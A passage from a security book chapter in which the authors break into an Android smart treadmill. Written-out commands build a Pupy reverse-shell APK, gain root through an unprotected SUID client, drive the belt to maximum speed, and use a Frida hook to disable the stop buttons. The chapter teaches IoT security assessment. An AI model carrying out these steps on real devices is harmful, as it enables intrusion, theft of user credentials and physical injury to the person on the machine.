<p>To control the environment the platform provides, vendors typically follow one of two possible approaches. They can integrate their product with a <em>Mobile Device Management (MDM) </em>software solution. MDM is a set of technologies that can be used to remotely administer the deployment, security, auditing, and policy enforcement of mobile devices. Otherwise, they can generate their own custom platform based on the <em>Android Open Source Project (AOSP)</em>. <span epub:type="pagebreak" title="387" id="Page_387"/>AOSP is freely available to download, customize, and install on any supported device. Both solutions offer numerous ways to limit the platform-provided functionalities and restrict the user access only to the intended ones. </p>
<figure>
<img src="Images/f15013.png" alt="f15013" width="300" height="566"/>
<figcaption><p><a id="figure15-13">Figure 15-13:</a> A smart treadmill’s stack</p></figcaption>
</figure>
<p>The device examined here uses a customized platform based on AOSP equipped with all the necessary apps. </p>
<h3 id="h2-500907c15-0007">Taking Control of the Android Powered Smart Treadmill</h3>
<p class="BodyFirst">In this section, we’ll walk through an attack on the smart treadmill that allowed us to control the speed and the incline of the device remotely.</p>
<h4 id="h3-500907c15-0008">Circumventing UI Restrictions</h4>
<p class="BodyFirst">The treadmill is configured to allow the user to access only selected services and functionalities. For example, the user can start the treadmill, select a specific exercise, and watch TV or listen to a radio program. They can also authenticate to a cloud platform to track their progress. Bypassing these restrictions could allow us to install services to control the device.</p>
<p>Adversaries who want to circumvent UI restrictions commonly target the authentication and registration screens. The reason is that, in most cases, these require browser integration, either to perform the actual authentication functionality or to provide supplementary information. This browser integration is usually implemented using components provided by the Android framework, such as WebView objects. WebView is a feature that allows developers to display text, data, and web content as part of an <span epub:type="pagebreak" title="388" id="Page_388"/>application interface without requiring extra software. Although useful for developers, it supports plenty of functionality that can’t be easily protected, and as a result, it’s often targeted. </p>
<p>In our case, we can use the following process to circumvent the UI restrictions. First, click the <b>Create new account</b> button on the device screen. A new interface should appear requesting the user’s personal data. This interface contains a link to the Privacy Policy. The Privacy Policy seems to be a file that is presented in WebView, as shown in <a id="figureanchor15-14" href="#figure15-14">Figure 15-14</a>.</p>
<figure>
<img src="Images/f15014.png" alt="f15014" width="714" height="400"/>
<figcaption><p><a id="figure15-14">Figure 15-14:</a> Registration interface with links to the Privacy Policy</p></figcaption>
</figure>
<p>Within the Privacy Policy are other links, such as the Cookies Policy file shown in <a id="figureanchor15-15" href="#figure15-15">Figure 15-15</a>. </p>
<figure>
<img src="Images/f15015.png" alt="f15015" width="716" height="404"/>
<figcaption><p><a id="figure15-15">Figure 15-15:</a> WebView displaying the Privacy Policy local file</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="389" id="Page_389"/>Fortunately, this policy file contains external links to resources hosted in remote servers, such as the one that appears as an icon in the top bar of the interface, as shown in <a id="figureanchor15-16" href="#figure15-16">Figure 15-16</a>. </p>
<figure>
<img src="Images/f15016.png" alt="f15016" width="716" height="404"/>
<figcaption><p><a id="figure15-16">Figure 15-16:</a> A link to an external site on the Cookies page</p></figcaption>
</figure>
<p>By selecting the link, the adversary can navigate to the vendor’s site and retrieve content that they wouldn’t have been able to access before, such as the site’s menus, images, videos and vendor’s latest news. </p>
<p>The final step is to attempt to escape from the cloud service to visit any custom website. The most common targets are usually the external web page’s Search Web Services buttons, which are shown in <a id="figureanchor15-17" href="#figure15-17">Figure 15-17</a>, because they allow users to access any other site by simply searching for it.</p>
<figure>
<img src="Images/f15017.png" alt="f15017" width="716" height="404"/>
<figcaption><p><a id="figure15-17">Figure 15-17:</a> An external site containing links to the Google search engine</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="390" id="Page_390"/>In our case, the vendor’s site has integrated the Google search engine so the site’s visitors can perform local searches for the website’s content. An attacker can click the small Google icon at the top left of the screen to transfer to the Google search page. Now we can navigate to any site by typing the site’s name in the search engine. </p>
<p>Alternatively, attackers could exploit the Login interface feature that allows users to authenticate with Facebook (<a id="figureanchor15-18" href="#figure15-18">Figure 15-18</a>) because it creates a new browser window. </p>
<figure>
<img src="Images/f15018.png" alt="f15018" width="572" height="320"/>
<figcaption><p><a id="figure15-18">Figure 15-18:</a> The authentication interface links to Facebook.</p></figcaption>
</figure>
<p>Then, when we click the Facebook logo shown in <a id="figureanchor15-19" href="#figure15-19">Figure 15-19</a>, we can escape from WebView into a new browser window that allows us to access the URL bar and navigate to other sites. </p>
<figure>
<img src="Images/f15019.png" alt="f15019" width="593" height="322"/>
<figcaption><p><a id="figure15-19">Figure 15-19:</a> A pop-up window that links to an external site</p></figcaption>
</figure>
<h4 id="h3-500907c15-0009"><span epub:type="pagebreak" title="391" id="Page_391"/>Attempting to Get Remote Shell Access</h4>
<p class="BodyFirst">With access to other sites, the attacker could now use their web browsing capabilities to navigate to a remotely hosted Android application executable and then attempt to directly download and install it on the device. We’ll try to install an Android app on our computer that would give us remote shell access to the treadmill: it’s called the <em>Pupy</em> agent (<a href="https://github.com/n1nj4sec/pupy" class="LinkURL">https://github.com/n1nj4sec/pupy</a><em>/</em>). </p>
<p>We first have to install the Pupy server to our system. Using the Git tool to download the code from the remote repository, we then navigate to its folder and use the <em>create-workspace.py</em><b><i> </i></b>script to set up the environment:</p>
<pre><code>$ <b>git clone --recursive https://github.com/n1nj4sec/pupy</b>
$ <b>cd pupy &amp;&amp; ./create-workspace.py pupyws</b></code></pre>
<p>Next, we can generate a new Android APK file using the <code>pupygen</code> command: </p>
<pre><code>$ <b>pupygen -f client -O android –o sysplugin.apk connect --host 192.168.1.5:8443</b></code></pre>
<p>The <code>-f</code> parameter specifies that we want to create a client application, the <code>-O</code> parameter stipulates that it should be an APK for Android platforms, the <code>-o</code> parameter names the application, the <code>connect</code> parameter requires the application to perform a reverse connection back to the Pupy server, and the <code>--host</code> parameter provides the IPv4 and port on which this server is listening.</p>
<p>Because we can navigate to custom websites through the treadmill’s interface, we can host this APK to a web server and try to directly access the treadmill. Unfortunately, when we tried to open the APK, we learned that the treadmill doesn’t allow you to install apps with an APK extension just by opening them through WebView. We’ll have to find some other way. </p>
<h4 id="h3-500907c15-0010">Abusing a Local File Manager to Install the APK</h4>
<p class="BodyFirst">We’ll use a different strategy to attempt to infect the device and gain persistent access. Android WebViews and web browsers can trigger activities on other apps installed on the device. For example, all devices equipped with an Android version later than 4.4 (API level 19) allow users to browse and open documents, images, and other files using their preferred document storage provider. As a result, navigating to a web page containing a simple file upload form, like the one in <a id="figureanchor15-20" href="#figure15-20">Figure 15-20</a>, will make Android look for installed File Manager programs.  </p>
<span epub:type="pagebreak" title="392" id="Page_392"/><figure>
<img src="Images/f15020.png" alt="f15020" width="566" height="286"/>
<figcaption><p><a id="figure15-20">Figure 15-20:</a> Accessing an external site that requests a file upload</p></figcaption>
</figure>
<p>Surprisingly, we discovered that the treadmill’s browser window can initiate a custom File Manager application by letting us select its name from the sidebar list in the pop-up window, as shown in <a id="figureanchor15-21" href="#figure15-21">Figure 15-21</a>. The one we’ve highlighted isn’t a default Android file manager and was probably installed as an extension in the Android ROM to allow the device manufacturer to perform file operations more easily.</p>
<figure>
<img src="Images/f15021.png" alt="f15021" width="587" height="325"/>
<figcaption><p><a id="figure15-21">Figure 15-21:</a> Opening a custom local File Manager</p></figcaption>
</figure>
<p>This File Manager has extensive functionalities: it can compress and decompress files, and it can even directly open other apps—a functionality that we’ll exploit to install a custom APK. In the File Manager, we locate the previously downloaded APK file and click the <b>Open</b> button, as shown in <a id="figureanchor15-22" href="#figure15-22">Figure 15-22</a>. </p>
<span epub:type="pagebreak" title="393" id="Page_393"/><figure>
<img src="Images/f15022.png" alt="f15022" width="575" height="314"/>
<figcaption><p><a id="figure15-22">Figure 15-22:</a> Abusing the local File Manager to execute a custom APK</p></figcaption>
</figure>
<p>The Android package installer, which is the default Android app that allows you to install, upgrade, and remove applications on the device, will then automatically initiate the normal installation process, as shown in <a id="figureanchor15-23" href="#figure15-23">Figure 15-23</a>.</p>
<figure>
<img src="Images/f15023.png" alt="f15023" width="575" height="325"/>
<figcaption><p><a id="figure15-23">Figure 15-23:</a> Executing a custom APK from the File Manager</p></figcaption>
</figure>
<p>Installing the Pupy agent will initiate a connection back to the Pupy server, as shown here. We can now use the remote shell to execute commands to the treadmill as a local user.</p>
<pre><code>[*] Session 1 opened (treadmill@localhost) (xx.xx.xx.xx:8080 &lt;- yy.yy.yy.yy:43535)
&gt;&gt; <b>sessions</b>
id user hostname platform release os_arch proc_arch intgty_lvl address tags
---------------------------------------------------------------------------
1 treadmill localhost android 3.1.10 armv7l 32bit Medium   yy.yy.yy.yy </code></pre>
<h4 id="h3-500907c15-0011"><span epub:type="pagebreak" title="394" id="Page_394"/>Escalating Privileges</h4>
<p class="BodyFirst">The next step is to perform privilege escalation. One way to achieve that is to look for <em>SUID binaries</em>, which are binaries that we can execute using a selected user’s permissions, even if the person executing them has lower privileges. More precisely, we’re looking for binaries that we can execute as the <em>root</em> user, which is the superuser on an Android platform. These binaries are common in Android-controlled IoT devices, because they allow apps to issue commands to the hardware and perform firmware updates. Normally, Android apps work in isolated environments (often called sandboxes) and can’t gain access to other apps or the system. But an app with superuser access rights can venture out of its isolated environment and take full control of the device. </p>
<p>We found that it’s possible to perform privilege escalation by abusing an unprotected SUID service installed on the device named <em>su_server</em>. This service was receiving commands from other Android applications over Unix domain sockets. We also found a client binary named <code>su_client</code> installed in the system. The client could be used to directly issue commands with root privileges, as shown here: </p>
<pre><code>$ <b>./su_client 'id &gt; /sdcard/status.txt' &amp;&amp; cat /sdcard/status.txt</b>
uid=0(root) gid=0(root) context=kernel</code></pre>
<p>The input issues the <code>id</code> command, which displays the user and group names and numeric IDs of the calling process to the standard output, and redirects the output to the file located at <em>/sdcard/status.txt</em>. Using the <code>cat </code>command, which displays the file’s contents, we retrieve the output and verify that the command has been executed with the<code> root</code> user’s permissions.</p>
<p>We provided the commands as command line arguments between single quotes. Note that the client binary didn’t directly return any command output to the user, so we had to first write the result to a file in the SD card. </p>
<p>Now that we have superuser permissions, we can access, interact, and tamper with another app’s functionalities. For example, we can extract the current user’s training data, their password for the cloud fitness tracking app, and their Facebook token, and change the configuration of their training program.</p>
<h4 id="h3-500907c15-0012">Remotely Controlling Speed and Incline</h4>
<p class="BodyFirst">With our acquired remote shell access and superuser permissions, let’s find a way to control the treadmill’s speed and incline. This requires investigating the software and the equipment’s hardware. See Chapter 3 for a methodology that can help you do this. <a id="figureanchor15-24" href="#figure15-24">Figure 15-24</a> shows an overview of the hardware design.</p>
<p>We discovered that the device is built on two main hardware components, called the Hi Kit and the Low Kit. The Hi Kit is composed of the CPU board and the device’s main board; the Low Kit is composed of a hardware control board that acts as an interconnection hub for the main components of the lower assembly. </p>
<span epub:type="pagebreak" title="395" id="Page_395"/><figure>
<img src="Images/f15024.png" alt="f15024" width="745" height="750"/>
<figcaption><p><a id="figure15-24">Figure 15-24:</a> A smart treadmill’s hardware design</p></figcaption>
</figure>
<p>The CPU board contains a microprocessor programmed with control logic. It manages and processes signals from the LCD touch screen, the NFC reader, the iPod docking station, a client USB port that allows users to connect external devices, and the built-in USB service port used to provide updates. The CPU board also handles the device’s network connectivity through its networking board. </p>
<p>The main board is the interface board for all the peripheral devices, such as the speed<b> </b>and<b> </b>incline<b> </b>joysticks, emergency buttons, and health sensors. The joysticks allow users to adjust the machine’s speed and elevation during exercise. Each time they’re moved forward or backward, they send a signal to the CPU board to change the speed or the elevation, depending on which joystick is used. The emergency stop button is a safety device that allows the user to stop the machine in an emergency situation. The sensors monitor the user’s heartbeat.</p>
<p>The Low Kit consists of the belt motor,<b> </b>the elevation motor, the inverter, and a limit switch. The belt motor and the elevation motor regulate the treadmill’s speed and incline. The inverter device supplies the <span epub:type="pagebreak" title="396" id="Page_396"/>belt motor with voltage. Variations in this voltage can cause corresponding variations in the tread belt’s acceleration. The limit switch restricts the belt motor’s maximum speed. </p>
<p><a id="figureanchor15-25" href="#figure15-25">Figure 15-25</a> shows how the software communicates with all of these peripheral devices. </p>
<figure>
<img src="Images/f15025.png" alt="f15025" width="600" height="750"/>
<figcaption><p><a id="figure15-25">Figure 15-25:</a> Software communication with the peripheral devices</p></figcaption>
</figure>
<p>Two components control the attached peripherals: a custom <em>Hardware Abstraction Layer</em><em>(HAL)</em> component and an embedded USB microcontroller. The HAL component is an interface implemented by the device vendor that allows the installed Android applications to communicate with hardware-specific device drivers. Android apps use the HAL APIs to get services from hardware devices. These services control the HDMI and the USB ports, as well as the USB microcontroller to send commands to change the belt motor’s speed or the elevation motor’s incline. </p>
<p>The treadmill contains a preinstalled Android app named the <em>Hardware Abstraction Layer APK</em> that uses these HAL APIs and another app named Equipment APK. The Equipment APK receives hardware commands from other installed apps through an exposed broadcast receiver and then transfers them to the hardware using the Hardware Abstraction Layer APK and the USB microcontroller, as shown in <a href="#figure15-25">Figure 15-25</a>.</p>
<p><span epub:type="pagebreak" title="397" id="Page_397"/>The device contains a number of other preinstalled apps, such as the Dashboard APK, which is responsible for the user interface. These apps also need to control the hardware and monitor the existing equipment state. The current equipment state is maintained in another custom preinstalled Android application named the Repository APK, which is in a shared memory segment. A <em>shared memory segment</em> is an allocated area of memory that multiple programs or Android apps can access at the same time using direct read or write memory operations. The state is also accessible through exposed Android content providers but using the shared memory allows for greater performance, which the device needs for its real-time operations.</p>
<p>For example, each time the user presses one of the Dashboard speed buttons, the device sends a request to the Repository APK’s content provider to update the device’s speed. The Repository APK then updates the shared memory and informs the Equipment APK using an Android Intent. Then the Equipment APK sends the appropriate command through the USB controller to the appropriate peripheral, as shown in <a id="figureanchor15-26" href="#figure15-26">Figure 15-26</a>.</p>
<figure>
<img src="Images/f15026.png" alt="f15026" width="750" height="635"/>
<figcaption><p><a id="figure15-26">Figure 15-26:</a> Sending a command from the Dashboard APK to the hardware</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="398" id="Page_398"/>Because we’ve gained local shell access with root privileges using the previous attack path, we can use the Repository APK’s exposed content provider to simulate a button activity. This would resemble an action received from the Dashboard APK. </p>
<p>Using the <code>content update</code> command, we can simulate the button that increases the treadmill’s speed: </p>
<pre><code>$ <b>content update --uri content:// com.vendorname.android.repositoryapk.physicalkeyboard.</b>
<b>  AUTHORITY/item    --bind JOY_DX_UP:i:1</b></code></pre>
<p>We follow the command with the <code>uri</code> parameter, which defines the exposed content provider, and the <code>bind</code> parameter, which binds a specific value to a column. In this case, the command performs an update request to the Repository APK’s exposed content provider named <code>physicalkeyboard.AUTHORITY/item</code> and sets the value of the variable named <code>JOY_DX_UP</code> to one. You can identify the full name of the application, as well as the name of the exposed content provider and the bind parameter, by decompiling the app using the techniques presented in Chapter 14 and “Analyzing Android Applications” on page 360.</p>
<p>The victim is now on a remotely controlled treadmill that is accelerating to its maximum speed!</p>
<h4 id="h3-500907c15-0013">Disabling Software and Physical Buttons</h4>
<p class="BodyFirst">To stop the device—or treadmill, in this case—the user can normally press one of the available dashboard screen buttons, such as the pause button, the restart button, the cool-down button, the stop button, or any buttons that control the device’s speed. These buttons are part of the pre-installed software that controls the device’s user interface. It’s also possible to halt the device using the physical joystick buttons that control the speed and incline or the <em>emergency stop key</em>, a completely independent physical button embedded in the lower part of the device hardware, as shown in <a id="figureanchor15-27" href="#figure15-27">Figure 15-27</a>. </p>
<figure>
<img src="Images/f15027.png" alt="f15027" width="499" height="144"/>
<figcaption><p><a id="figure15-27">Figure 15-27:</a> Software and physical buttons that allow a user to stop the treadmill</p></figcaption>
</figure>
<p>Each time the user presses one of the buttons, the device uses the Android IPC. An insert, update, or delete operation takes place in the content provider part of the app that controls the device’s speed. </p>
<p>We can use a simple Frida script to disable this communication. <em>Frida</em> is a dynamic tampering framework that allows the user to replace specific <span epub:type="pagebreak" title="399" id="Page_399"/>in-memory function calls. We used it in Chapter 14 to disable an Android app’s root detection. In this case, we can use a similar script to replace the repository app’s content provider update functionality to stop receiving new intents from the buttons. </p>
<p>Initially, we create a port forward for port 27042, which the Frida server will use, using the Pupy agent’s <code>portfwd </code>command: </p>
<pre><code>$ <b>run portfwd -L 127.0.0.1:27042:127.0.0.1:27042</b></code></pre>
<p>The <code>-L</code> parameter indicates that we want to perform a port forward from port 27042 of the localhost 127.0.0.1 to the remote device at the same port. The hosts and ports must be separated with the colon (:) character. Now whenever we connect to this port on our local device, a tunnel will be created connecting us to the same port on the target device.</p>
<p>Then we upload the Frida server for ARM platforms (<a href="https://github.com/frida/frida/releases/" class="LinkURL">https://github.com/frida/frida/releases/</a>) to the treadmill using Pupy’s <code>upload</code> command: </p>
<pre><code>$ <b>run upload frida_arm /data/data/org.pupy.pupy/files/frida_arm</b></code></pre>
<p>The <code>upload</code> command receives, as the first argument, the location of the binary that we want to upload to our device, and as the second argument, the location in which to place this binary on the remote device. We use our shell access to mark the binary as executable using the <code>chmod</code> utility and start the server:</p>
<pre><code>$ <b>chmod 777 /data/data/org.pupy.pupy/files/frida_arm</b>
$<b> /data/data/org.pupy.pupy/files/frida_arm &amp;</b></code></pre>
<p>Then we use the following Frida script, which replaces the button functionality with instructions to perform no action:</p>
<pre><code>var PhysicalKeyboard = Java.use(“com.vendorname.android.repositoryapk.cp.PhysicalKeyboardCP”);<span class="CodeAnnotation">1</span>
PhysicalKeyboard.update.implementation = function(a, b, c, d){
return;
}</code></pre>
<p>As mentioned earlier, the Repository APK handles the buttons’ activities. To locate the exact function that you need to replace <span class="CodeAnnotation">1</span>, you’ll have to decompile the app using the techniques presented in “Analyzing Android Applications” on page 360.</p>
<p>Finally, we install the Frida framework on our system using the <code>pip</code> package manager for Python and execute the previous Frida script:</p>
<pre><code>$ <b>pip install frida-tools</b>
$ <b>frida -H 127.0.0.1:27042 –f com.vendorname.android.repositoryapk -l script.js</b></code></pre>
<p>We use the <code>-H</code> parameter to specify the Frida server’s host and port, the <code>-f</code> parameter to specify the full name of the targeted application, and the <code>-l</code> parameter to select the script. We must provide the application’s full name in the command, which, once again, you can find by decompiling the app. </p>
<p><span epub:type="pagebreak" title="400" id="Page_400"/>Now, even if the victim attempts to select one of the software buttons in the Dashboard APK or press the physical buttons that control the speed and incline to stop the device, they won’t succeed. Their only remaining choices are to locate and press the emergency stop button at the lower part of the device hardware or find another way to turn off the power.</p>
<h4 id="h3-500907c15-0014">Could This Vulnerability Exploitation Cause a Fatal Accident?</h4>
<p class="BodyFirst">The chance of a user getting a serious injury as a result of the attacks we’ve described isn’t negligible. The device reached a speed of 27 km/h, or 16.7 mph. Most commercial treadmills can reach speeds between 12 and 14 mph; the highest-end models top out at 25 mph. Let’s compare this speed with the men’s 100 meters final race at the 2009 World Athletics Championships held at the Olympic Stadium in Berlin. Usain Bolt finished in a world record-breaking time of 9.58 seconds and was clocked at 44.72 km/h, or 27.8 mph! Unless you’re as fast as Bolt, you probably won’t be able to outrun the treadmill.</p>
<p>A number of real-life incidents verify the danger of a smart treadmill attack. Dave Goldberg, the SurveyMonkey CEO, lost his life after hitting his head in a treadmill accident. (According to the autopsy, a heart arrhythmia might have also contributed to his death.) In addition, between 1997 and 2014, an estimated 4,929 patients went to US emergency rooms with head injuries they sustained while exercising on treadmills. </p>
<h2 id="h1-500907c15-0004">Conclusion</h2>
<p class="BodyFirst">In this chapter, we explored how an adversary could tamper with popular IoT devices found in modern smart homes and businesses. You learned how to circumvent modern RFID door locks and then jam wireless alarm systems to avoid detection. You played back security camera feed obtained from network traffic. Then we walked through how you might take over control of a smart treadmill to cause the victim potentially fatal injuries.</p>
<p>You could use the case studies provided to walk through a holistic smart home assessment or treat them as a testament to the underlying impact that vulnerable smart home IoT devices might introduce. </p>
<p>Now go explore your own smart home!</p>
</section>
</div></body></html>